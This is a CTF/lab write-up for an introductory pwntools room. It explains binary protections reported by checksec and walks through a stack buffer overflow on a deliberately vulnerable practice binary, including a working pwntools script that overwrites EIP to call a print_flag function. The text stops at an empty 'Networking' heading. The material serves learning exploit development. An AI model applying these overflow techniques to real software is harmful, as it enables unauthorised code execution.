cd### whats PWNtools
Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible. [Pwntools Github page here.](https://github.com/Gallopsled/pwntools)

The other tool we will be using is pwndbg, which is "a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers" ([pwndbg Github page](https://github.com/pwndbg/pwndbg)).

Lastly, if you would like to download the challenges from this room to use on your own machine, you can find them (and my solutions) on my Github: [https://github.com/dizmascyberlabs/IntroToPwntools](https://github.com/dizmascyberlabs/IntroToPwntools).
# Checksec tool
i Choose to clone the repo and work with it inside my Kali VM where i have PWNtools set up, we first enter inside the Checksec directory where we can find two executable that works the same one but one has been compiled with protections to mitigate binary exploitation.

after running the command :
```
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/checksec]
└─$ checksec intro2pwn1
[*] '/home/kali/Desktop/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
                                                                                            
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/checksec]
└─$ checksec intro2pwn2
[*] '/home/kali/Desktop/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

```

we can see that we get different results depending on the protection set or not. these binaries both have the same architecture (i386-32-little), but differ in qualities such as RELRO, Stack canaries , NX, PIE, and RWX. Now, what are these qualities?

**RELRO** stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack, although this is outside the scope of this room. If you are interested, you can refer to this blog post: [https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro).

**Stack canaries** are tokens placed after a stack to detect a stack overflow. These were supposedly named after birds that coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here: [https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/).

**NX** is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.  On the vulnerable binary, you may have noticed the extra line **RWX** that indicates that there are segments which can be read, written, and executed. See this Wikipedia article for more details: [https://en.wikipedia.org/wiki/Executable_space_protection](https://en.wikipedia.org/wiki/Executable_space_protection)

**PIE** stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this: [https://access.redhat.com/blogs/766093/posts/1975793](https://access.redhat.com/blogs/766093/posts/1975793)[](https://access.redhat.com/blogs/766093/posts/1975793)

If you want a good overview of each of the checksec tested qualities, I have found this guide to be useful: [https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)

So from these and because of stack canaries when a buffer overflow occurs on the secure program it returns :

```
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/checksec]
└─$ ./intro2pwn1       
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./intro2pwn1
```

but in the vulnerable binary we get :

```
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/checksec]
└─$ ./intro2pwn2
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
zsh: segmentation fault  ./intro2pwn2
```

segmentation faute so if the overflow was a real address it would jump into it.
# Cyclic tool
there we get a intro2pwn3 binary that is vulnerable to buffer overflows we can see that by :

```
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/cyclic]
└─$ checksec intro2pwn3 
[*] '/home/kali/Desktop/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

no canary. it uses a get() function that is vulnerable to buffer overflows. the name variable has 24 bytes allocated. 

An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.

To control the IP we need to fire up gdb with the binary, then we run with the input of the characters inside alphabet file, a segmentation occurs with rip pointing to 0x4a4a4a4a and an invalid address error 0x4a4a4a4a

Great, now we see that we can control the eip! Before we move on, I would like to talk about patterns. The alphabet file was useful here, but it can be time consuming to type all of that into a file (or write a script for it) every time you want to test a buffer overflow, and if the buffer is large, the alphabet file might not be big enough. This is where the cyclic tool comes in. The cyclic tool can be used both from the command line and in python scripts. The command line format is "cyclic number", like:

`cyclic 100`

This will print out a pattern of 100 characters.

example:
```
┌──(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/cyclic]
└─$ pwn cyclic 12      
aaaabaaacaaa
```

If you have used pattern_create from the Metasploit Framework, this is works in a similar way. We can create a pattern file like this:

`cyclic 100 > pattern`

and then run the pattern file as input in gdb like we did with the alphabet file.
## PWNing for the flag
We can now begin to develop our exploit. To use pwntools in a python file, create a python file (mine is pwn_cyclic.py) and import the pwntools module at the top of the file:

`from pwn import *`

We can then use the cyclic function within the python code:

`padding = cyclic(100)`

Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before 'jaaa' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called cyclic_find(), which will find this automatically. Please replace the 100 with cyclic_find('jaaa'):

`padding = cyclic(cyclic_find('jaaa'))`

What do we fill the eip with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like 0xdeadbeef. We cannot, of course, simply write "0xdeadbeef" as a string, because the computer would interpret it as ascii, and we need it as raw hex. Pwntools offers an easy way to do this, with the p32() function (and p64 for 64-bit programs). This is similar to the struct.pack() function, if you have ever used it. We can add this to our code:

`eip = p32(0xdeadbeef)`

the code will look like this : 
```
from pwn import *
padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)
payload = padding + eip
print(payload)
```

```
┌──(.venv)─(kali㉿kali)-[~/Desktop/IntroToPwntools/IntroToPwntools/cyclic]
└─$ python3 exploit.py
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa\xef\xbe\xad\xde'
```

we can now pipe the result to a file using > and give it to gdb as we did previously.

The last thing we need to do is find the location of the print_flag() function. To find the print_flag() funtion, type this command into gdb:

`print& print_flag`

For me, the print_flag() function is at 0x8048536, please check to see if it is the same for you.

Replace the 0xdeadbeef in your code with the location of the print_flag function. Once, again, we can run:

`python pwn_cyclic.py > attack`  

Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:

`./intro2pwn3 < attack`

```
from pwn import *
import sys

offset = cyclic_find(b'jaaa') # Confirm this returns 44
padding = cyclic(offset)
eip = p32(0x08048536) # Correct address of print_flag

payload = padding + eip

sys.stdout.buffer.write(payload)
```
# Networking
